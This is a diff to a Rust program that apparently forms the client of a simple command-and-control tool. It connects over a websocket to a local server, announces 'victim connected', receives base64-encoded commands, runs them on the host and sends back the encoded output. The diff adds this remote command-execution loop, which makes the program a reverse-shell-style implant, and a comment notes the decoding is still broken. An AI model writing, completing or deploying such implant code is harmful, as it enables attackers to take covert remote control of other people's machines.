@@ -1,6 +1,25 @@
 use tungstenite::{connect, Message};
 use base64::prelude::*;
 use rand::Rng;
+use std::process::{Command, Stdio};
+
+fn run(cmmd : String) -> String {
+    
+    // run the passed command and get output
+    
+    let cmmd = cmmd.split(" ").collect::<Vec<&str>>();
+    
+    // replace command with cmd to run in windows
+    let output = Command::new("command")
+        .stdout(Stdio::piped())
+        .args(cmmd)
+        .spawn() 
+        .expect("Failed to execute command");
+
+    let status = output.wait_with_output().unwrap();
+    
+    return String::from_utf8(status.stdout).unwrap();
+}
 
 fn encode(inp : String) -> String {
     // base 64 encode 
@@ -25,28 +44,22 @@ fn decode(inp : String) -> String {
     return String::from_utf8(BASE64_STANDARD.decode(inp).unwrap()).unwrap();
 }
 
-
-
-
 fn main() {
     
     let (mut socket, response) = connect("ws://localhost:8080/wsCli").expect("Can't Connect");
     drop(response);
     println!("connected to server");
 
-//    socket.send(Message::text(cli_message)).unwrap();
+    socket.send(Message::text("victim connected")).unwrap();
     
     loop {
-        let msg = socket.read().expect("Error reading message");        
-    
-
-
-
-
+        let msg = &socket.read().expect("Error reading message");        
+        // our decode function is throwing an error, maybe because input isnt encoded
+        // on servers
+        let cmmd = decode((msg.to_text().unwrap()).to_string());
+        let output = run(cmmd);
+        socket.send(Message::text(encode(output).as_str())).unwrap();
     }
 
-
-
 }
-
 
